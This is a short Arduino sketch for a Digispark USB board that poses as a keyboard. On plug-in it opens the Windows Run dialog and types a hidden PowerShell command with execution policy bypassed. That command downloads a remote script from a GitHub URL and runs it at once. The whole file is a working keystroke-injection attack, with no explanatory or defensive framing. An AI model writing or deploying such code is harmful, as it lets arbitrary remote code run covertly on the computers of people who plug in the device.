#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.sendKeyStroke(0);   // Prevent missing the first character/key stroke
  delay(1000);                     // This delay can't be lower than 1 second
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   // Send Windows Key + R
  delay(500);                                        // Delay in miliseconds
  DigiKeyboard.print("powershell -W H -Ex B -c \"irm https://github.com/Reginald-Gillespie/G/raw/main/i.ps1 | iex\"");
  delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(0, LOW);  
}
void loop() {}
